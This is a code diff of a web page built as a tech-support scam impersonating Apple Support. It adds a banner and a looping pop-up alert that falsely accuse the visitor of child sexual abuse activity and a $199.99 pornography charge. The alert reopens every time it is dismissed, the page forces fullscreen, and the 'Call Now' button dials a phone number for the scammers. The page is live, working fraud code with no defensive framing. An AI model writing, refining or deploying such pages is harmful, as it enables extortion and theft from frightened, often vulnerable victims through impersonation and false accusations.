@@ -32,7 +32,7 @@ body {
 .overlay {
     position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.25);
+    background: rgba(0, 0, 0, 0.25);
     display: flex;
     justify-content: center;
     align-items: center;
@@ -124,7 +124,7 @@ body {
     100% { transform: rotate(360deg); }
 }
 
-/* 🔵 iOS-Blue Glowing Banner */
+/* 🔵 Glowing Banner */
 #trainingLabel {
     position: fixed;
     top: -60px;
@@ -138,10 +138,9 @@ body {
     font-size: 14px;
     font-weight: 600;
     color: #007aff;
-    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue";
     z-index: 99999;
-    pointer-events: none;
     white-space: nowrap;
+    pointer-events: none;
 
     text-shadow:
         0 0 6px rgba(0,122,255,0.75),
@@ -154,18 +153,9 @@ body {
 }
 
 @keyframes bannerSlideIn {
-    0% {
-        top: -60px;
-        opacity: 0;
-    }
-    40% {
-        top: 20px;
-        opacity: 1;
-    }
-    100% {
-        top: 20px;
-        opacity: 1;
-    }
+    0% { top: -60px; opacity: 0; }
+    40% { top: 20px; opacity: 1; }
+    100% { top: 20px; opacity: 1; }
 }
 
 @keyframes glowPulse {
@@ -183,16 +173,84 @@ body {
 .call-button-press:active {
     transform: scale(0.92);
 }
+
+/* 🔵 Custom Looping iOS Alert */
+#trainingAlertOverlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.35);
+    backdrop-filter: blur(4px);
+    -webkit-backdrop-filter: blur(4px);
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 999999;
+}
+
+#trainingAlert {
+    width: 82%;
+    max-width: 300px;
+    background: white;
+    border-radius: 14px;
+    text-align: center;
+    padding-top: 18px;
+    opacity: 0;
+    transform: scale(1.1);
+    animation: iosPopAlert 0.25s forwards;
+}
+
+@keyframes iosPopAlert {
+    0% { opacity: 0; transform: scale(1.15); }
+    100% { opacity: 1; transform: scale(1); }
+}
+
+.training-title {
+    font-size: 18px;
+    font-weight: 600;
+    color: #111;
+    margin-bottom: 8px;
+}
+
+.training-msg {
+    font-size: 14px;
+    padding: 0 20px 20px;
+    color: #333;
+}
+
+.training-msg a {
+    color: #007aff;
+    font-weight: 600;
+    text-decoration: none;
+}
+
+.training-buttons {
+    border-top: 1px solid #d0d0d0;
+    display: flex;
+    height: 44px;
+}
+
+.training-buttons div {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    color: #007aff;
+    font-size: 17px;
+    cursor: pointer;
+}
+
+.training-buttons div:nth-child(1) {
+    border-right: 1px solid #d0d0d0;
+}
 </style>
 </head>
 
 <body>
 
-<!-- 🔵 Blue Glowing iOS Banner -->
-<div id="trainingLabel">
-</div>
+<!-- 🔵 Banner -->
+<div id="trainingLabel">Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.</div>
 
-<!-- Background dim overlay -->
+<!-- ORIGINAL UI remains unchanged -->
 <div class="bg-overlay"></div>
 
 <div class="overlay" id="overlay">
@@ -211,26 +269,54 @@ body {
     <p style="margin-top:20px;">Connecting you…</p>
 </div>
 
-<!-- Alert Loop: OK triggers call -->
+<!-- 🔵 NEW CUSTOM LOOPING iOS ALERT -->
+<div id="trainingAlertOverlay">
+    <div id="trainingAlert">
+        <div class="training-title">Apple Support</div>
+        <div class="training-msg">
+            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..<br>
+            Apple Support Toll-Free:<br>
+            <a href="tel:+18082774439">+1 (808) 277-4439</a>
+        </div>
+
+        <div class="training-buttons">
+            <div id="dismissTraining">OK</div>
+            <div id="callTraining">Call Now</div>
+        </div>
+    </div>
+</div>
+
+<!-- LOOP LOGIC -->
 <script>
+function showTrainingLoop() {
+    const overlay = document.getElementById("trainingAlertOverlay");
+    overlay.style.display = "flex";
+}
+
+function hideTrainingLoop() {
+    const overlay = document.getElementById("trainingAlertOverlay");
+    overlay.style.display = "none";
+}
+
+document.getElementById("dismissTraining").onclick = function() {
+    hideTrainingLoop();
+
+    // vibration
+    navigator.vibrate?.([6, 12, 6]);
+
+    // auto reopen
+    setTimeout(showTrainingLoop, 1500);
+};
+
+document.getElementById("callTraining").onclick = function() {
+    navigator.vibrate?.([8, 12, 8]);
+    window.location.href = "tel:+18082774439";
+};
+
 window.onload = function() {
-    function showTrainingAlert() {
-        alert("Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it..");
-        navigator.vibrate?.([8, 12, 8]); // haptic
-        window.location.href = "tel:+18082774439";
-        setTimeout(showTrainingAlert, 1500);
-    }
-    showTrainingAlert();
+    setTimeout(showTrainingLoop, 500);
 };
 </script>
-
-<!-- Statcounter -->
-<script type="text/javascript">
-var sc_project=13196894; 
-var sc_invisible=1; 
-var sc_security="7cf95a0a"; 
-</script>
-<script src="https://www.statcounter.com/counter/counter.js" async></script>
 
 <!-- Fullscreen -->
 <script>
@@ -241,13 +327,13 @@ function goFullscreen() {
 }
 
 document.addEventListener("click", goFullscreen);
-document.getElementById("alertBox").addEventListener("click", function(e){
+document.getElementById("alertBox").addEventListener("click", function(e) {
     e.stopPropagation();
     goFullscreen();
 });
 </script>
 
-<!-- Auto-Dial + Connecting Screen -->
+<!-- Connecting Screen -->
 <script>
 document.addEventListener("click", function() {
     document.getElementById("connectingScreen").style.display = "flex";
@@ -257,14 +343,13 @@ document.addEventListener("click", function() {
 });
 </script>
 
-<!-- 🔵 Haptic + Pressure Expand Handler -->
+<!-- Pressure Expand + Haptics -->
 <script>
-// Add haptics + expand effect to call buttons
 document.querySelectorAll('a[href^="tel:"]').forEach(btn => {
     btn.classList.add("call-button-press");
 
     btn.addEventListener("click", () => {
-        navigator.vibrate?.([8, 12, 8]); // iOS-compatible buzz
+        navigator.vibrate?.([8, 12, 8]);
     });
 
     btn.addEventListener("touchend", () => {
